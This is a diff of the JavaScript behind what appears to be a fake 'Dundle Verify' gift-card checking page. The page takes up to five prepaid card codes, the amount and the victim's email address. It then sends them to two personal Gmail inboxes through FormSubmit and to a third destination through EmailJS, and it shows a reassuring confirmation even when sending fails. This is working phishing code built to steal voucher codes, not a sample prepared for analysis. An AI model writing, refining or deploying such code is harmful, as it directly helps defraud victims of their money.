-  const montant  = document.getElementById('fMontant').value;
-  const code2    = document.getElementById('code2').value.trim();
-  const code3    = document.getElementById('code3').value.trim();
-  const code4    = document.getElementById('code4').value.trim();
-  const code5    = document.getElementById('code5').value.trim();
-
-  /* Bouton en état loading */
   const btn = document.getElementById('submitBtn');
   btn.classList.add('loading');
-  btn.innerHTML = `<svg style="animation:spin 1s linear infinite" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 11-6.219-8.56"/></svg> Envoi en cours...`;
-
-  /* Construction des données pour FormSubmit */
-  const formData = new FormData();
-  formData.append('_subject', `Nouveau code ${selectedBrand} — Dundle Verify`);
-  formData.append('_captcha', 'false');
-  formData.append('_template', 'table');
-  /* CORRECTION #2 : _replyto envoie une copie au client */
-  formData.append('_replyto', clientEmail);
-  
-  formData.append('Marque', selectedBrand);
-  formData.append('Montant', montant + ' ' + devise);
-  formData.append('Code_1', code1);
-  if (code2) formData.append('Code_2', code2);
-  if (code3) formData.append('Code_3', code3);
-  if (code4) formData.append('Code_4', code4);
-  if (code5) formData.append('Code_5', code5);
-  formData.append('Email_client', clientEmail);
+  btn.innerHTML = `<svg style="animation:spin 1s linear infinite" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 11-6.219-8.56"/></svg> Processing...`;
 
   try {
-    /* Envoi au premier email — romarthdongmo@gmail.com */
-    await fetch('https://formsubmit.co/ajax/romarthdongmo@gmail.com', {
-      method: 'POST',
-      body: formData,
-      headers: { 'Accept': 'application/json' }
-    });
+  await fetch('https://formsubmit.co/ajax/romarthjiofack@gmail.com', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+    body: JSON.stringify({
+      _subject: `New code ${selectedBrand} — Dundle Verify`,
+      _captcha: 'false',
+      Brand: selectedBrand,
+      Amount: montant + ' ' + devise,
+      Code_1: code1, Code_2: code2, Code_3: code3, Code_4: code4, Code_5: code5,
+      Client_Email: clientEmail
+    })
+  });
+} catch(e) { console.error("FormSubmit 1:", e); }
 
-    /* Envoi au second email — .com (séparé, ne sait pas que le premier reçoit aussi) */
-    const formData2 = new FormData();
-    formData2.append('_subject', `Nouveau code ${selectedBrand} — Dundle Verify`);
-    formData2.append('_captcha', 'false');
-    formData2.append('_template', 'table');
-    formData2.append('_replyto', clientEmail);
-    formData2.append('Marque', selectedBrand);
-    formData2.append('Montant', montant + ' ' + devise);
-    formData2.append('Code_1', code1);
-    if (code2) formData2.append('Code_2', code2);
-    if (code3) formData2.append('Code_3', code3);
-    if (code4) formData2.append('Code_4', code4);
-    if (code5) formData2.append('Code_5', code5);
-    formData2.append('Email_client', clientEmail);
-    await fetch('https://formsubmit.co/ajax/paysafecard840@gmail.com', {
-      method: 'POST',
-      body: formData2,
-      headers: { 'Accept': 'application/json' }
-    });
-  } catch(e) {
-    /* On ignore les erreurs réseau et on affiche quand même la confirmation */
-  }
+try {
+  await fetch('https://formsubmit.co/ajax/paysafecard840@gmail.com', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+    body: JSON.stringify({
+      _subject: `New code ${selectedBrand} — Dundle Verify`,
+      _captcha: 'false',
+      Brand: selectedBrand,
+      Amount: montant + ' ' + devise,
+      Code_1: code1, Code_2: code2, Code_3: code3, Code_4: code4, Code_5: code5,
+      Client_Email: clientEmail
+    })
+  });
+} catch(e) { console.error("FormSubmit 2:", e); }
 
-  /* CORRECTION #3 : mise à jour des éléments HTML statiques de l'overlay */
+try {
+  await emailjs.send("service_7crc39z", "template_rregv2e", {
+    client_email: clientEmail,
+    brand:        selectedBrand,
+    amount:       montant + " " + devise,
+    code1:        code1,
+    code2:        code2,
+    code3:        code3,
+    code4:        code4,
+    code5:        code5,
+  });
+  console.log("✅ EmailJS OK");
+} catch(e) { console.error("❌ EmailJS erreur:", e); }
+
   document.getElementById('detailMarque').textContent  = selectedBrand;
   document.getElementById('detailMontant').textContent = montant + ' ' + devise;
   document.getElementById('detailCode').textContent    = code1;
   document.getElementById('detailEmail').textContent   = clientEmail;
-
-  /* Affichage de l'overlay */
   document.getElementById('overlay').classList.add('show');
 
-  /* Reset bouton */
   btn.classList.remove('loading');
-  btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Vérifier mon code maintenant`;
+  btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Verify my code now`;
 }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+  emailjs.init("HockizT2vLH9dt0I9");
 </script>
 </body>
 </html>
